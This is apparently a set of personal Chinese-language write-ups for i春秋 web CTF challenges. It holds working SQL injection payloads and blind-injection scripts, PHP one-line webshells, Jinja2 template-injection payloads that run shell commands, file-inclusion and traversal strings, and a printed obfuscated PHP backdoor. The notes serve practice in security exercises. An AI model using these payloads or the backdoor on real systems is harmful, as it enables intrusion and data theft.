# web

## flag在变量中（i春秋）

文件包含题

1. 这个代码的作用是如果匹配正则表达式/^\w*$/，就打印变量$$a，$a是hello，$$a是六位变量$hello

2. 由于$a在函数中，所以函数之外无法访问。如果要访问，将hello修改为超全局变量GLOBALS。

3. 在URL后加?hello=GLOBALS，将参数hello修改为Globals

实际执行语句：
```
eval("var_dump($$a);")
eval("var_dump($hello);")
eval("var_dump($GLOBALS);")
```
$GLOBALS的作用：引用全局作用域中可用的全部变量。就可以导出所有的变量

## flag不在变量中（i春秋）

查看globals变量，没有

网传waritup有两种：

/?hello=file_get_contents('flag.php')

/?hello=${@eval($_POST[1])}

都不成功，最后： ?hello=file("flag.php")

```
ile() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。
readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。
file_get_contents() 把整个文件读入一个字符串中。
```

## 爆破3（i春秋）
```
<?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```
1、whoami需要等于传递的value值的前两位，并且value的md5值的第5为开始，长度为4的字符串==0，这样num++，所以构造calue为数组；
2、whoami=str_rands，循环10次后，输出flag。

大佬的脚本

```
import requests

url = "http://b49c840973a243d094483c60bf42a34e4c4b863cd17e4e51.changame.ichunqiu.com/?value[]=ea"
#al = ['abcdefghijklmnopqrstuvwxyz'] //这里没有理解，注释掉一样出来结果
s = requests.session()
r=s.get(url)

for i in range(20):
    url = "http://b49c840973a243d094483c60bf42a34e4c4b863cd17e4e51.changame.ichunqiu.com/?value[]=" + r.content[0:2]
    r=s.get(url)
    print r.content
```

## upload（i春秋）

上传一句话木马，访问php，@eval($_POST[1]); ?> ，发现<?被过滤

构造php

```
<script language="PHP">
   echo((file_get_contents('../flag.'.'php')));
</script>
```

## code（i春秋）

?jpg=index.php get参数读取源码，src中的base64解码

wp说和phpStorm有关，于是百度一下phpStorm，学习到phpstorm写的会有一个 .idea 文件夹，里面存储了一些配置文件，发现了fl3g_ichuqiu.php

```
$file = 'fl3gconfigichuqiu.php';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
```
源码中config替换成_

?jpg=fl3gconfigichuqiu.php，base64解码发现

```
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');

//获取length位数的随机字符串
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

//加密过程，txt是明文，key是秘钥
function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
        $tmp .= chr(ord($txt[$i])+10);				//txt内容的ascii码增加10
    }
    $txt = $tmp;
    $rnd=random(4);									//取4位随机字符
    $key=md5($rnd.$key);							//随机字符与秘钥进行拼接得到新的秘钥
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];				//将明文与key按位进行异或
    }
    return base64_encode($rnd.$ttmp);				//base64加密
}

//解密过程，txt是密文，key是秘钥
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);						//减掉4位随机数		
    $txt = substr($txt,4);							//真正的密文
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $tmp .= $txt[$i]^$key[++$s];				 //将密文与秘钥进行异或得到tmp
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;									//明文
}
$username = decrypt($_COOKIE['user'],$key);			//获取cookie的内容
if ($username == 'system'){							//如果解密后等于system打印flag
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));		//否则打印表情
    echo "╮(╯▽╰)╭";
}
?>
```

整个过程先解密验证username，r如果不符合再加密塞进cookie，

所以解题应该先解密，得到key， 再加密

大佬的脚本

```python
# _*_ coding: utf-8 _*
from base64 import *
import requests
import string

//设置URL
url='http://6d739233fb8c4844aaa45b57db9cbd81908d8ccb6ec64ed9.changame.ichunqiu.com/fl3g_ichuqiu.php'

cookie = requests.get(url).cookies['user']			#请求该URL，获取user的COOKIE值

txt = b64decode(cookie)								#将得到的cookie进行base64解码
rnd = txt[:4]		 								#密文前四位是随机字符
tmp = txt[4:]										#guest与key进行异或的密文，5位
key = list('123456')								#key为6位的字符，目前不知是啥
guest = list('guest')								#guest明文
system = list('system')									

for i in range(0,len(guest)):
	guest[i] = chr(ord(guest[i]) + 10)				#为加密做准备

for i in range(0,len(guest)):
	key[i] = chr(ord(tmp[i]) ^ ord(guest[i]))		#得到key的前五位

for i in range(0,len(system)):
	system[i] = chr(ord(system[i]) + 10)			#同样是为了加密做准备

//准备爆破key的第6位
s = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"

tmp_news = ''										#system与key的异或值
cookie_system = []
xstr = ""

for ch in s:
	key[5] = ch
	for i in range(0,len(system)):
		tmp_news += chr(ord(system[i]) ^ ord(key[i]))
	xstr = rnd + tmp_news							#随机字符与异或的结果拼接
	cookie_system.append(b64encode(xstr))			#base64加密，并加入到cookie_system中
	tmp_news = ""

print(cookie_system)

for i in cookie_system:
	cookie = {'user':i.decode()}					#设置cookie
	res = requests.get(url,cookies = cookie)		
	if "flag" in res.text:
		print res.text
```


## YeserCMS（i春秋）

https://www.cnblogs.com/RenoStudio/p/10541876.html

dirsearch 扫描，python3 dirsearch.py -u 链接 -e *

发现 /amin, /falg.php

cmseasy 漏洞

构造url：http://57f208a0b1164a51a627a8c5645433ee0a4fbc4fc36a4159.changame.ichunqiu.com//celive/live/header.php

1、试验--暴库

post：xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(database())) ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

2、拿表

post:

xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database() ),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

 3、爆管理员账号密码

这里就不爆用户名字段名和密码字段名了，其实在这个站中就是username和password

xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx', (UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password)) from yesercms_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>

拿到用户名|密码，登录后台，文件读取，抓包读post参数../../flag.php

## SQL

sql注入题，发现关键字被过滤，用<>绕过过滤

?id=1+u<>nion+s<>elect 1,group_concat(flAg_T5ZNdrm),3 from info

### include（i春秋）

文件包含漏洞

搜索一下`allow_url_include `看看是否打开：

php://input协议，使用post传递参数<?php system("ls");?>

使用`php://filter/read=convert.base64-encode/resource=dle345aae.php`读取文件内容：

## 123（i春秋）

一句话木马大全

https://www.cnblogs.com/Rcsec/p/9426301.html

`<?=eval($_POST['cmd']);`

## zone（i春秋）

文件包含

抓包cookie:login=1 绕过登录

输入/manages/admin.php?module=ind../ex&name=php发现可以正常访问于是猜想../被替换为空，所以将../改为..././于是访问/manages/admin.php?module=..././..././..././etc/passwd&name=

发现site-enabled/dedault,查看发现存在目录遍历

URL/online-movies../ 

## SQLI（i春秋）

过滤，union连接用join


```
/l0gin.php?id=-1%27 union select * from (select group_concat(distinct(database()))) a join (select version()) b%23 

/l0gin.php?id=-1%27 union select * from (select group_concat(table_name) from information_schema.tables where table_schema='sqli') a join (select version()) b%23


/l0gin.php?id=-1%27 union select * from (select group_concat(column_name) from information_schema.columns where table_name='users') a join (select version()) b%23 

/l0gin.php?id=-1%27 union select * from (select group_concat(flag_9c861b688330) from users) a join (select version()) b%23 
```


## getflag（i春秋）

1. 先计算MD5值

```
import requests
import base64
import sys
import hashlib

def getmd5(index):
	for i in range(100000,100000000):
		x = i
		md5 = hashlib.md5(str(x).encode('utf8')).hexdigest()
		if md5[:6] == index:
			return x
	
print(getmd5('f4a552'))

```

2. 再登录，发现username存在注入，使用 admin'#登录成功
3. 登进去存在文件下载，提示flag.php在根目录
4. 根据文件下载路径，尝试下载flag.php, /Challenges/file/download.php?f=/var/www/html/Challenges/flag.php
5. 读源码，给/Challenges/flag.php添加post参数flag=flag，绕过验证


## SQLI（i春秋）

考点：php sprintf()格式化字符串漏洞

sprintf（）方法就是对15种类型做了匹配，15种类型以外的就直接break了没有做任何处理

如果我们输入"%\"或者"%1$\",他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么"%\","%1$\"就因为没有经过任何处理而被替换为空。

因此sprintf注入的原理就是，我们用一个15种类型之外的"\" 来代替格式字符类型让函数替换为空，则“%1$\'”后面的单引号就能闭合前面的单引号

脚本盲注

## upload（i春秋）

源码提示post的方法发送ichunqiu=你发现的东西

reposne的头部包含一个flag的base64,base64解码后用脚本post到url

```
import base64
import requests

def main():
    a = requests.session()
    b = a.get('http://d704458a0abd40959ff0de9e0e58f7fd776f4f848e8a442b.changame.ichunqiu.com/')
    key1 = b.headers['flag']
    c = base64.b64decode(key1)
    d = str(c).split(":")
    key = base64.b64decode(d[1])
    body = {"ichunqiu":key}
    f = a.post("http://d704458a0abd40959ff0de9e0e58f7fd776f4f848e8a442b.changame.ichunqiu.com/",data=body)
    print(f.text)

if __name__ == '__main__':
    main()

```
得到一个path字符串，访问这个url，是个登录页面，存在**svn源码泄露**

/3712901a08bb58557943ca31f3487b7d/.svn/wc.db，访问后提示MD5后的username

登录和前面getflag相似，先解md5验证码,登录后提示7815696ecbf1c96e6894b779456d330e.php,访问3712901a08bb58557943ca31f3487b7d/7815696ecbf1c96e6894b779456d330e.php

文件上传，改后缀为pht,获得flag

## hash（i春秋）

观察参数?key=123&hash=f9109d5f83921a551cf859f853afe7bb，查看源码提示$hash=md5($sign.$key);the length of $sign is 8，md5(f9109d5f83921a551cf859f853afe7bb)=kkkkk01123

构造payload: ?key=111&hash=md5(kkkkk01111)

提示访问Gu3ss_m3_h2h2.php，代码审计

反序列化绕过_wakeup,如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 

```
<?php
class Demo {
    private $file = 'Gu3ss_m3_h2h2.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct() {
        echo @highlight_file($this->file, true);
    }
    function __wakeup() {
        if ($this->file != 'Gu3ss_m3_h2h2.php') {
            //the secret is in the f15g_1s_here.php
            $this->file = 'Gu3ss_m3_h2h2.php';
        }
    }}
	$a = new Demo('f15g_1s_here.php');
	$s = serialize($a);
	echo $s;
	echo '<br>';
	echo preg_match('/[oc]:\d+:/i', $s);
	$s=str_replace("4","4+",$s);
	//不明白为什么变成4+
	//O:4+:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
	$s=str_replace(":1:",":8:",$s);
	//O:4+:"Demo":8:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
	echo preg_match('/[oc]:\d+:/i', $s);
	echo '<br>';
	echo base64_encode($s);
?>
```

绕过显示f15g_1s_here.php,addslashes转义，它会将我们的’”都进行转义

Payload：f15g_1s_here.php?val=${eval($_GET[a])}&a=echo `cat True_F1ag_i3_Here_233.php`;

writeup: https://www.cnblogs.com/wosun/p/11505950.html

## 再见CMS

1. 注册用户，记住uid和邮箱
2. 报错测试

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid=
```

3. 爆破数据库名

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid= , address=(select version()) where uid = 3 %23 
```

4. 爆破表

```
ichunqiu.com/member/userinfo.php?job=edit&step=2
POST：
truename=ycc%0000&Limitword[000]=&email=ycc@qq.com&provinceid= , address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid = 3 %23 
```
5.查列名

```
address=(select group_concat(distinct(column_name)) from information_schema.columns where table_name = (select distinct(table_name) from information_schema.tables where table_schema = database() limit 1) ) where uid = 3 %23 
```

sql注入 load_file，直接写成load_file('/var/www/html/flag.php')是不行的，引号会被转义，转成16进制

```
address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870) ) where uid = 3 %23 
```

## fuzzing（i春秋）

抓包发现response头部hint: ip,Large internal network

设置X-Forwarded-For:10.0.0.0，提示/m4nage.php

访问/m4nage.php，尝试post key=1，提示key is not right,md5(key)==="1b4167610ba3f2ac426a68488dbd89be",and the key is ichunqiu***,the * is in [a-z0-9]，post key=ichunqiu105，得到提示the next step: xx00xxoo.php

访问xx00xxoo.php，提示源码在x0.txt，访问后执行函数得到flag

## hello world

这题考的是git源码泄露，extract_git脚本扫描下载

对比flag.js和flag.js.04bb09，差异的地方就是flag

### notebook

session文件包含漏洞

/action.php?module=&file= 用文件包含打开phpinfo.php

打开phpinfo.php，可以看到open_basedir是/var/www/html/:/tmp，open_basedir是可将用户访问文件的活动范围限制在指定的区域。注意用open_basedir指定的限制实际上是前缀,而不是目录名。

用file=phpinfo.php，可以看到session.save_path是/temp/SESS，可以使用session包含，

注：浏览器后缀直接ichunqiu.com/phpinfo.php打开时，session.save_path和以上action文件执行不一致，不明白为什么

payload:?module=&file=../../../../tmp/SESS/sess_nlloqni0ef0tpqbt3jdj81rj75

注：注册登录后，你注册的账号在cookie里已设置了PHPSESSID，因此sess_nlloqni0ef0tpqbt3jdj81rj75就是sess_PHPSESSID

访问后可以看见用户名和uid，发现注册没有任何限制，注册用户名<?php system('cat flag.php'); ?>，登录后执行上面payload

一下博客详细介绍了session包含漏洞：https://blog.csdn.net/weixin_43803070/article/details/91047032

大佬的writeup:https://bbs.ichunqiu.com/thread-16750-1-1.html

https://www.jianshu.com/p/624fe6d09c0b


## blog（i春秋）

**insert注入**

留言板存在注入，猜测insert语句的值类似于: (username,title,content)
于是这里构造的insert语句类似于 ... values('aaa','testpayload2','test')#

这个payload过去报错了，这说明猜测的insert字段有误，既然不是三个，更不可能是两个，受控制的部分已经有两个了，因此推测insert语句的字段数为4.

查数据库名 title=1&content=test','X'),('aaa',(select database()),'content

查密码用户名 post: title=1&content=test','X'),('aaa',(SELECT group_concat(password) from users),'content

能看见一个密码是我刚才注册的 一个是admin的密码 登录admin,发现manager页面，存在文件包含

??module=php://filter/read=convert.base64-encode/resource=../flag&name=php

大佬的wp：https://blog.csdn.net/qq_30123355/article/details/58161312

## 登录（i春秋）
1.sql盲注

盲注的脚本都没跑出来

2.git源码泄露

登录后提示/.bctfg1t，用gitstack下载源码`changame.ichunqiu.com/Challenges/.bctfg1t/`

之后执行git log，然后使用得到的commit，执行git reset --hard commit，回滚到之前的版本，再查看flag.php，啥变化都没有

然后大佬wp提示查cat /.git/refs/stash,获得版本的hash值，然后git reset --hard 哈希值

然后打开flag.php,提示flag在/71ec9d5ca5580c58d1872962c596ea71.php，或得flag，但是提交不正确

涉及到的git命令 

```
git cat-file -p hash值
git ls-tree hash值
```

也可以用git-extract，结果也是一样的，但是git-extranct不需要回滚版本，下载下来的是全部commit历史记录的文件

https://www.jianshu.com/p/0ea09975169d

https://www.jianshu.com/p/0ea09975169d

## sqli

https://blog.csdn.net/nzjdsds/article/details/82152085

## look（i春秋）

response头部显示verity,作为参数，注入4个字符显示error,注入5个字符显示过长，所以写个dic跑

```
from multiprocessing.pool import ThreadPool
from lxml import etree
from bs4 import BeautifulSoup
import logging

payload = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'

for i in xrange(32, 126+1):
    for i2 in xrange(32, 126+1):
        print('\'' + chr(i) + chr(i2) + '%23')
        
python look.py > look.dic
```
burp抓包跑，’%1# 注入成功，提示5211ec9dde53ee65bb02225117fba1e1.php，response提viminfo

访问 .viminfo配置文件，提示/var/www/icq/5211ec9dde53ee65bb02225117fba1e1.php.backup~~~

访问/5211ec9dde53ee65bb02225117fba1e1.php.backup，页面源码代码审计，有个set names utf8，使用ç=c绕过

注：MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写, Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s ，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。
可以看到大写O和Ö是相等的

绕过后提示c3368f5eb5f8367fd548b228bee69ef2.php，访问后代码审计

```
<?php
if(isset($_GET['path']) && isset($_GET['filename'])){
    $path = $_GET['path'];
    $name = "upload/".$_GET['filename'];
}
else{
    show_source(__FILE__);
    exit();
}
if(strpos($name,'..') > -1){
    echo 'WTF';
    exit();
}

if(strpos($path,'http://127.0.0.1/') === 0){
    file_put_contents($name,file_get_contents($path));
}
else{
    echo 'path error';
}
?>
```

接受两个参数，不能上跳，读取path的内容写到/upload/$file里面，

wp 往5211ec9dde53ee65bb02225117fba1e1.php?usern3me=<?php phpinfo();?>注入一句话，需要二次url编码，尝试成功

最后 c3368f5eb5f8367fd548b228bee69ef2.php/?path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=<?php $_REQUEST[0];?>&filename=1.php二次编码写入成功

访问/upload/1.php?0=cat ../flag_is_here.php

大佬的write-up地址 

https://www.cnblogs.com/haozhizhi/p/10786382.html

https://www.ichunqiu.com/course/56485

## EXEC（i春秋）
1.wp提示/index.php.swp 源码泄露，访问/.index.php.swp

2.源码

```
/*
flag in flag233.php
*/
 function check($number)
{
        $one = ord('1');
        $nine = ord('9');
        for ($i = 0; $i < strlen($number); $i++)
        {
                $digit = ord($number{$i});
                if ( ($digit >= $one) && ($digit <= $nine) )
                {
                        return false;
                }
        }
           return $number == '11259375';
}
if(isset($_GET[sign])&& check($_GET[sign])){
        setcookie('auth','tcp tunnel is forbidden!');
        if(isset($_POST['cmd'])){
                $command=$_POST[cmd];
                $result=exec($command);
                //echo $result;
        }
}else{
        die('no sign');
}
```

绕过check函数，将11259375转base64

3.



## fuzz (i春秋)

**考点：python模板注入**

[出题人讲解视频](https://www.ichunqiu.com/course/56487)

[Flask/Jinja2中的服务端模版注入（一）](https://www.freebuf.com/articles/web/98619.html)

[Flask/Jinja2中的服务端模版注入（二）](https://www.freebuf.com/articles/web/98928.html)

提示please fuzz，参数注入，基本的参数都试一试，?name=1时回显，尝试sql注入不成功

Flask/Jinja2中存在的SSTI漏洞读取和写入文件，尝试`?name={{config}}`，返回flask的config配置的字典对象


```
//向服务器写入文件，当编译完成为subprocess模块引入check_output方法，并将其设置指向变量RUNCMD
?name={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
 
//注入'/tmp/owned.cfg'，向config对象添加一个新项
?name={{ config.from_pyfile('/tmp/owned.cfg') }}

//验证是否能运行命令行
?name={{ config['RUNCMD']('/usr/bin/id',shell=True) }}
```

执行命令 ls，不成功，执行pwd，成功回显，存在字符过滤，使用反引号注入base64编码后执行解码命令，例如`echo bHMK | base64 -d`

```
//执行ls，成功
?name={{ config['RUNCMD']('`echo bHMK | base64 -d`',shell=True) }} //echo bHMK | base64 -d 解码

//执行ls -a，成功
?name={{ config['RUNCMD']('`echo bHMgLWEK | base64 -d`',shell=True) }}

//打开网页主目录，ls -a /var/www/html，回显fl4g
?name={{ config['RUNCMD']('`echo bHMgLWEgL3Zhci93d3cvaHRtbAo= | base64 -d`',shell=True) }}

//执行cat命令，cat /var/www/html/fl4g
?name={{ config['RUNCMD']('`echo Y2F0IC92YXIvd3d3L2h0bWwvZmw0Zwo= | base64 -d`',shell=True) }}
```

## backdoor（i春秋）

1.访问/.git，响应码是403不是404，用githack下载.git，回滚到上一个commit,提示flag在b4ckdo0r.php

2.访问后提示你能耗到我的源码吗，访问/.b4ckdo0r.php.swo下载源码，注意b4ckdo0r前面的`.`，

3.下载后用恢复该文件，`vim -r b4ckdo0r.php.swo`，将内容拷贝到新建文件中，可以看到很多变量，但是就是一些字符串，打印$L变量，得到源码

```php
<?php
$kh="4f7f";
$kf="28d7";
function x($t,$k){
    $c=strlen($k);
    $l=strlen($t);
    $o="";
    for($i=0;$i<$l;){
        for($j=0;($j<$c&&$i<$l);$j++,$i++){
            $o.=$t{$i}^$k{$j};
        }
    }
    return $o;
}

$r=$_SERVER;
$rr=@$r["HTTP_REFERER"];
$ra=@$r["HTTP_ACCEPT_LANGUAGE"];
if($rr&&$ra){
    $u=parse_url($rr);
    parse_str($u["query"],$q);
    $q=array_values($q);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);
    if($q&&$m){
        @session_start();
        $s=&$_SESSION;
        $ss="substr";
        $sl="strtolower";
        $i=$m[1][0].$m[1][1];
        $h=$sl($ss(md5($i.$kh),0,3));
        $f=$sl($ss(md5($i.$kf),0,3));
        $p="";
        for($z=1;$z<count($m[1]);$z++)
            $p.=$q[$m[2][$z]];
        if(strpos($p,$h)===0){
            $s[$i]="";$p=$ss($p,3);
        }
        if(array_key_exists($i,$s)){
            $s[$i].=$p;$e=strpos($s[$i],$f);
            if($e){
                $k=$kh.$kf;
                ob_start();
                @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));
                
                $o=ob_get_contents();
                ob_end_clean();
                $d=base64_encode(x(gzcompress($o),$k));
                print("<$k>$d</$k>");
                @session_destroy();
            }
        }
    }
}
?>
```

## ssrfme

看大佬wp得到的提示就是github上的开源项目Rtiny：https://github.com/r0ker/Rtiny-xss/tree/master

构造pass为数组，得到报错信息，提示Rtiny

这个项目存在多处sql注入点，查看项目源码可以发现除了pass,email参数外，还要构造username，并且经过`self.get_secure_cookie`塞进cookie里

解题：

1.本地搭建tornado，安装指令python -m pip install tornado，然后运行下列脚本，访问127.0.0.1/index，得到cookie里加密后的报错注入的username

```
# coding:utf-8
import tornado.ioloop
import tornado.web 
# @author: V0W
# @reference: https://blog.csdn.net/include_heqile/article/details/82591707

settings = { 
   "cookie_secret" : "M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=",
}

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        # 依次执行下列语句，爆破数据库，表，列和字段
        self.write("helloword")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select version()))) -- ")
        # self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))-- ")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name='manager')))-- ")
        # self.set_secure_cookie("username","' and extractvalue(1,concat(0x5c,mid((select group_concat(username) from manager),30,62))) -- ")
        # self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,(select load_file('/var/www/html/f13g_ls_here.txt'))))#")
        self.set_secure_cookie("username", "' and extractvalue(1,concat(0x5c,mid((select load_file('/var/www/html/f13g_ls_here.txt')),28,60)))#")
        self.write(self.get_secure_cookie("username"))

def make_app():
    return tornado.web.Application([
        (r"/index", MainHandler),
        ], **settings)

if __name__ == "__main__":
    app = make_app()
    app.listen(8089)
    tornado.ioloop.IOLoop.instance().start()
```

2.访问i春秋login，cookie里加入username，但是页面没有报错，将login改为lock后报错，并回显信息
![image](http://note.youdao.com/yws/res/688/C339F77E0B454474BE632AA22EAC0988)

3.最后爆破username和password时没有正确回显，可能是环境被破坏，按照wp的用户和密码也登录不正确，跳过

4.根据wp，flag在f13g_ls_here.txt下，构造注入语句回显flag，由于flag长度做了限制，所以分两步爆破

[大佬的wp](https://www.cnblogs.com/wosun/p/11675151.html)

## Mangager(i春秋)

1.登录抓包发现post时会有_nonce参数，一串字符，前端login.js发现一段代码，生成的就是这个串随机码

```js
function getnonce() {
    var text = "";
    var possible = "0123456789abcdef";
    for (var i = 0; i < 40; i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
```
尝试修改这串码发现提示不合法， 猜测是前后端通用的验证机制

2.在boptstrap.js里有一段sign函数，太长了，粘贴部分

```
$(document).ready(function() {
	$("#" + "f" + "r" + "m" + "l" + "o" + "g" + "i" + "n").submit(function(e) {
	    //z1,z2为username和passowrd的值
	    var z1 = $("#" + "u" + "s" + "e" + "r" + "n" + "a" + "m" + "e").val();
	    var z2 = $("#" + "p" + "a" + "s" + "s" + "w" + "o" + "r" + "d").val();
	    $('<' + 'i' + 'n' + 'p' + 'u' + 't' + '>').attr({
		    type: 'h' + 'i' + 'd' + 'd' + 'e' + 'n',
		    name: '_' + 'n' + 'o' + 'n' + 'c' + 'e',
		    //这里是重点，调用的这个sign函数
		    //第三个参数"YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "=="，也就是"YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD=="
		    value: sign(z1 + z2, "YTY" + "0Yj" + "M0Y" + "2Rh" + "ZTZ" + "iMj" + "liZ" + "jFj" + "OTQ" + "xOD" + "==")
		}).appendTo('#' + 'f' + 'r' + 'm' + 'l' + 'o' + 'g' + 'i' + 'n');
	});
});

function sign (data, key) {
    var privateKey
    var i, j
    var W = new Array(80)
    var A, B, C, D, E
    var H0 = 0x97B5D3F1
    var H1 = 0x1F3D5B79
    var H2 = 0x684A2C0E
    var H3 = 0xE0C2A486
    var H4 = 0x33221100
    var H5 = 0xF0F0F0F0
    var temp
    var _RSA = function (n, s) {
        var t4 = (n << s) | (n >>> (32 - s))
        return t4
    }
    var _Rot = function (val) {
        var str = ''
        var i
        var v
        for (i = 7; i >= 0; i--) {
            v = (val >>> (i * 4)) & 0x0f
            str += v.toString(16)
        }
        return str
    }
    //前面都是废话，只有这里调用了参数
    str = unescape(encodeURIComponent(key + data))
    ...
```

用Python验证这个方法，与抓包显示一致

```
import hashlib

str="YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==admin123"
print(hashlib.sha1(str).hexdigest())
//16fba050a134988ddff375d83ce4c18750f93870
```

最终盲注脚本
```
import hashlib
import string
import requests

def sha1(s):
    s = "YTY0YjM0Y2RhZTZiMjliZjFjOTQxOD==" + s
    return hashlib.sha1(s).hexdigest()

url = 'http://b7bb9d7701ed444ca2a1fa62ed1375a17b58727eba0b48c4.changame.ichunqiu.com/login.php'

headers = {
    "Content-Type": 'application/x-www-form-urlencoded'
}

temp = ''
for i in xrange(1, 50):
    for p in xrange(32, 126+1):
        # payload = " 'or ascii(substr((database()), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='login'), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'), {}, 1)) = {}%23".format(i, p)
        # payload = " 'or ascii(substr((select p@ssw0rd from users), {}, 1)) = {}%23".format(i, p)
        payload = " 'or ascii(substr(`p@ssw0rd`, {}, 1)) = {}%23".format(i, p)
        # print(p, payload)
        nonce = sha1(payload.replace('%23', '#') + '1')

        data = 'a={}&username={}&password=1&_nonce={}'.format('a'*26209, payload, nonce)
        r = requests.post(url, headers = headers, data=data)
        if len(r.content) == 782:
            temp += chr(p)
            print(temp)
            break
```

最后爆出admin和MyIchunq1uSuperL0ng&&SecurePa$$word，登录后就有了flag
